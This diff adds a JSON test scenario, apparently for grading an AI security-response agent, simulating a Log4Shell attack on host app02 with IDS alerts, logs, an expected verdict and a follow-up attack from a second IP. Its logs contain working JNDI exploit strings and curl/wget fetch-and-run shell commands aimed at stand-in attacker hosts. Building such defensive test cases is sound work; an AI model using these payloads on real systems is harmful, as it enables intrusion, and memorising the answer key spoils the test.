@@ -1,0 +1,154 @@
+{
+  "id": "s2",
+  "name": "Log4Shell exploit succeeds on app02; attacker pivots after the block",
+  "description": "Headline demo. app02 runs log4j-core 2.14.1 with no egress filtering. The JNDI payload triggers an outbound LDAP callback and java spawns a shell. Correct outcome: SUCCEEDED, block 203.0.113.66, propose isolation (needs approval). After the block the attacker returns from 198.51.100.23 with the same exploit; the verifier surfaces the new alert and the agent blocks the second IP too.",
+  "expected": {
+    "verdict": "SUCCEEDED",
+    "blocked_ips": ["203.0.113.66", "198.51.100.23"],
+    "escalated": false,
+    "unsafe_block_ips": []
+  },
+  "alerts": [
+    {
+      "alert_id": "alt-2001",
+      "timestamp": "2026-09-10T14:02:51.412Z",
+      "event_type": "alert",
+      "flow_id": 881256001,
+      "src_ip": "203.0.113.66",
+      "src_port": 51822,
+      "dest_ip": "10.20.0.22",
+      "dest_port": 8080,
+      "proto": "TCP",
+      "app_proto": "http",
+      "alert": {
+        "signature": "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228) (Inbound) (ldap)",
+        "signature_id": 2034647,
+        "category": "Attempted Administrator Privilege Gain",
+        "severity": 1
+      }
+    }
+  ],
+  "flows": {
+    "881256001": {
+      "flow_id": 881256001,
+      "src_ip": "203.0.113.66",
+      "dest_ip": "10.20.0.22",
+      "dest_port": 8080,
+      "proto": "TCP",
+      "bytes_toserver": 742,
+      "bytes_toclient": 512,
+      "pkts": 11,
+      "duration_ms": 388,
+      "http": {
+        "method": "GET",
+        "hostname": "orders.orbital-retail.example",
+        "url": "/api/orders?ref=${jndi:ldap://203.0.113.66:1389/a}",
+        "user_agent": "${jndi:ldap://203.0.113.66:1389/a}",
+        "status": 200,
+        "length": 512
+      },
+      "payload_printable": "GET /api/orders?ref=${jndi:ldap://203.0.113.66:1389/a} HTTP/1.1\r\nUser-Agent: ${jndi:ldap://203.0.113.66:1389/a}\r\nX-Api-Version: ${jndi:ldap://203.0.113.66:1389/a}"
+    }
+  },
+  "logs": {
+    "app02": {
+      "web": [
+        {"ts": "2026-09-10T14:02:49Z", "line": "10.20.0.7 - - [10/Sep/2026:14:02:49 +0000] \"GET /healthz HTTP/1.1\" 200 15 \"-\" \"kube-probe/1.29\""},
+        {"ts": "2026-09-10T14:02:51Z", "line": "203.0.113.66 - - [10/Sep/2026:14:02:51 +0000] \"GET /api/orders?ref=${jndi:ldap://203.0.113.66:1389/a} HTTP/1.1\" 200 512 \"-\" \"${jndi:ldap://203.0.113.66:1389/a}\""},
+        {"ts": "2026-09-10T14:02:55Z", "line": "172.16.9.40 - - [10/Sep/2026:14:02:55 +0000] \"GET /api/orders?ref=ORD-88213 HTTP/1.1\" 200 1490 \"-\" \"orders-web/2.3\""}
+      ],
+      "app": [
+        {"ts": "2026-09-10T14:02:51Z", "line": "2026-09-10T14:02:51.601Z WARN  [http-nio-8080-exec-7] o.a.l.c.lookup.JndiLookup - lookup jndi:ldap://203.0.113.66:1389/a"},
+        {"ts": "2026-09-10T14:02:52Z", "line": "2026-09-10T14:02:52.240Z INFO  [http-nio-8080-exec-7] c.o.orders.OrderController - order lookup ref=${jndi:ldap://203.0.113.66:1389/a} result=0"}
+      ],
+      "outbound": [
+        {"ts": "2026-09-10T14:02:52Z", "line": "2026-09-10T14:02:52.118Z host=app02 conn out src=10.20.0.22:45122 dst=203.0.113.66:1389 proto=tcp bytes_out=812 bytes_in=2310 state=ESTABLISHED"},
+        {"ts": "2026-09-10T14:02:52Z", "line": "2026-09-10T14:02:52.744Z host=app02 conn out src=10.20.0.22:45123 dst=203.0.113.66:8000 proto=tcp bytes_out=310 bytes_in=14822 state=ESTABLISHED"},
+        {"ts": "2026-09-10T14:03:10Z", "line": "2026-09-10T14:03:10.002Z host=app02 conn out src=10.20.0.22:45140 dst=10.20.0.60:5432 proto=tcp bytes_out=1820 bytes_in=9033 state=ESTABLISHED"}
+      ],
+      "process": [
+        {"ts": "2026-09-10T14:02:53Z", "line": "2026-09-10T14:02:53.004Z host=app02 proc=java pid=2231 user=tomcat spawned child=/bin/sh args=\"-c (curl -s http://203.0.113.66:8000/x.sh||wget -qO- http://203.0.113.66:8000/x.sh)|sh\""},
+        {"ts": "2026-09-10T14:02:54Z", "line": "2026-09-10T14:02:54.310Z host=app02 proc=sh pid=2298 user=tomcat spawned child=/usr/bin/curl args=\"-s http://203.0.113.66:8000/x.sh\""}
+      ],
+      "auth": [
+        {"ts": "2026-09-10T13:55:41Z", "line": "Sep 10 13:55:41 app02 sshd[1188]: Accepted publickey for ansible from 10.20.0.2 port 50990 ssh2: ED25519 SHA256:8Jw1...pQ"}
+      ]
+    }
+  },
+  "allowlist": [],
+  "faults": {},
+  "triggers": [
+    {
+      "on": "block_ip",
+      "ip": "203.0.113.66",
+      "do": [
+        {
+          "add_alert": {
+            "alert_id": "alt-2002",
+            "timestamp": "2026-09-10T14:06:12.907Z",
+            "event_type": "alert",
+            "flow_id": 881256077,
+            "src_ip": "198.51.100.23",
+            "src_port": 60211,
+            "dest_ip": "10.20.0.22",
+            "dest_port": 8080,
+            "proto": "TCP",
+            "app_proto": "http",
+            "alert": {
+              "signature": "ET EXPLOIT Apache log4j RCE Attempt (CVE-2021-44228) (Inbound) (ldap)",
+              "signature_id": 2034647,
+              "category": "Attempted Administrator Privilege Gain",
+              "severity": 1
+            }
+          }
+        },
+        {
+          "add_flow": {
+            "flow_id": 881256077,
+            "src_ip": "198.51.100.23",
+            "dest_ip": "10.20.0.22",
+            "dest_port": 8080,
+            "proto": "TCP",
+            "bytes_toserver": 745,
+            "bytes_toclient": 512,
+            "pkts": 11,
+            "duration_ms": 402,
+            "http": {
+              "method": "GET",
+              "hostname": "orders.orbital-retail.example",
+              "url": "/api/orders?ref=${jndi:ldap://198.51.100.23:1389/b}",
+              "user_agent": "${jndi:ldap://198.51.100.23:1389/b}",
+              "status": 200,
+              "length": 512
+            },
+            "payload_printable": "GET /api/orders?ref=${jndi:ldap://198.51.100.23:1389/b} HTTP/1.1"
+          }
+        },
+        {
+          "add_logs": {
+            "host": "app02",
+            "web": [
+              {"ts": "2026-09-10T14:06:12Z", "line": "198.51.100.23 - - [10/Sep/2026:14:06:12 +0000] \"GET /api/orders?ref=${jndi:ldap://198.51.100.23:1389/b} HTTP/1.1\" 200 512 \"-\" \"${jndi:ldap://198.51.100.23:1389/b}\""}
+            ],
+            "app": [
+              {"ts": "2026-09-10T14:06:13Z", "line": "2026-09-10T14:06:13.020Z WARN  [http-nio-8080-exec-3] o.a.l.c.lookup.JndiLookup - lookup jndi:ldap://198.51.100.23:1389/b"}
+            ],
+            "outbound": [
+              {"ts": "2026-09-10T14:06:13Z", "line": "2026-09-10T14:06:13.455Z host=app02 conn out src=10.20.0.22:45210 dst=198.51.100.23:1389 proto=tcp bytes_out=812 bytes_in=2290 state=ESTABLISHED"}
+            ],
+            "process": [
+              {"ts": "2026-09-10T14:06:14Z", "line": "2026-09-10T14:06:14.101Z host=app02 proc=java pid=2231 user=tomcat spawned child=/bin/sh args=\"-c curl -s http://198.51.100.23:8000/y.sh|sh\""}
+            ]
+          }
+        },
+        {
+          "emit_event": {
+            "type": "new_alert",
+            "alert_id": "alt-2002",
+            "note": "New alert alt-2002 against app02 from 198.51.100.23, same signature as alt-2001, 3 minutes after the block."
+          }
+        }
+      ]
+    }
+  ]
+}
